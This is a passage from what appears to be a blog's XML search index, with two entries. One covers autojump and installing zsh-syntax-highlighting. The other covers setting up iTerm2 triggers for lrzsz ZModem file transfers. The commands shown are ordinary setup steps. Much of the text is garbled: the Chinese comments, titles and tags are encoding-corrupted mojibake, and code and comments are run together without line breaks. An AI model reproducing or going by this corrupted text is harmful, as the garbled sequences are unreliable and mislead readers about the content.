'/Users/XXX/Desktop/code/sharkâ€™è¿™å¥ä»£ç çš„å«ä¹‰ï¼šj -a ä½ å®šä¹‰çš„å¿«æ·å‘½ä»¤ â€˜éœ€è¦è·³è½¬çš„ç›®å½•ä½ç½®â€™æ­¤åè¦æ˜¯æƒ³è¿›å…¥sharkç›®å½•ï¼Œé™¤äº†ä¼ ç»Ÿçš„cdä¸€çº§ä¸€çº§çš„è¿›å…¥ï¼Œè¿˜å¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼šj s # æ¥ä¸‹æ¥å¯ä»¥æ„‰æ‚¦çš„ä½¿ç”¨ j äº† å®‰è£… zsh-syntax-highlighting 123456789101112131415# åˆ° ~/.zshrc ç›®å½•, å…‹éš†ä»“åº“# è¿™é‡Œé»˜è®¤çš„æ˜¯ä¸»ç›®å½•, å½“ç„¶å¯ä»¥ä¸‹è½½åˆ°å…¶å®ƒç›®å½•# ps: åœ¨é‚£ä¸ªç›®å½•, git cloneå°±ä¼šä¸‹è½½åˆ°å“ªä¸ªç›®å½•git clone https://github.com/zsh-users/zsh-syntax-highlighting.git# source the script åˆ° ~/.zshrc# è¿™ä¸ªåœ¨å“ªä¸ªç›®å½•ä¸‹echoçš„, å°±ä¼šæŠŠå½“å‰ç›®å½•æ‹¼åˆ°å‰é¢?? ç»“æœå¥½åƒæ˜¯è¿™æ ·echo "source $&#123;(q-)PWD&#125;/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" &gt;&gt; $&#123;ZDOTDIR:-$HOME&#125;/.zshrc# åœ¨plugins=(git zsh-autosuggestions autojump zsh-syntax-highlighting) zsh-syntax-highlighting, ä¸å‰è€…ç”¨ç©ºæ ¼éš”å¼€# å…¶å®è¿™é‡Œä¸åŠ å¥½åƒä¹Ÿæ²¡äº‹, è¿˜æ˜¯åŠ ä¸Šä¸ºå¥½# åœ¨å½“å‰ shellç”Ÿæ•ˆ# çœ‹è¿™ä¸ªæ–‡ä»¶åœ¨å“ªä¸ªç›®å½•, åœ¨å“ªä¸ªç›®å½•å°±source å“ªä¸ªç›®å½•, ç«‹å³ç”Ÿæ•ˆsource ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh]]></content>
      <categories>
        <category>Linux</category>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iTerm2ä¸Šä½¿ç”¨ lrzszé»‘ç§‘æŠ€ ä¸Šä¼ ä¸‹è½½æ–‡ä»¶åˆ°è¿œç«¯]]></title>
    <url>%2F2018%2F05%2F23%2FTools%2FiTerm2%2FiTerm2%E4%B8%8A%E4%BD%BF%E7%94%A8lrzsz%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[ZModem integration for iTerm 2This script can be used to automate ZModem transfers from your OSX desktop to a server that can run lrzsz (in theory, any machinethat supports SSH), and vice-versa. The minimum supported iTerm2 version is 1.0.0.20120108 Troubleshooting Sending a directory may fail: this is a known issue If you are using tmux or some other terminal multiplexer (ie: screen), try using the -e option to sz and/or rz on your server to force escaping of more characters during transmission. This tool may also fail if you are using expect or rlogin as it expects a mostly-clean 8-bit connection between the two parties. Setup Install lrzsz on OSX: brew install lrzsz Save the iterm2-send-zmodem.sh and iterm2-recv-zmodem.sh scripts in /usr/local/bin/ Set up Triggers in iTerm 2 like so: Regular expression: rz waiting to receive.\*\*B0100 Action: Run Silent Coprocess Parameters: /usr/local/bin/iterm2-send-zmodem.sh Instant: checked Regular expression: \*\*B00000000000000 Action: Run Silent Coprocess Parameters: /usr/local/bin/iterm2-recv-zmodem.sh Instant: checked To send a file to a remote machine: Type rz on the remote machine Select the file(s) on the local machine to send Wait for the coprocess indicator to disappear The receive a file from a remote machine Type sz filename1 filename2 â€¦ filenameN on the remote machine Select the folder to receive to on the local machine Wait for the coprocess indicator to disappear Future plans (patches welcome) Visual progress bar indicator]]></content>
      <categories>
        <category>å·¥å…·</category>
        <category>iTerm2</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>å·¥å…·</tag>
        <tag>iTerm2</tag>
      </tags>
  </entry>
</search>
